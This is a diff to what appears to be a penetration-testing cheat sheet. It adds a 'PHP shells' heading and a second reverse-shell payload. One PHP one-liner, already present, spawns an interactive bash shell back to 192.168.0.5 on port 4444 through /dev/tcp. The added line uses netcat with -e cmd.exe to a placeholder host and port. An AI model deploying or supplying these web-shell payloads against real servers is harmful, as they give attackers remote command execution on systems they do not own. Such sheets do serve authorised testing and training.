@@ -587,9 +587,11 @@ c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
 C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe
 ```
 
-Bypass PHP disable functions
+PHP shells / Bypass PHP disable functions
 ```
 <?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'"); ?>
+
+<?php echo shell_exec("nc [local] [port] -e cmd.exe"); ?>
 ```
 
 ## Linux Privilege Escalation
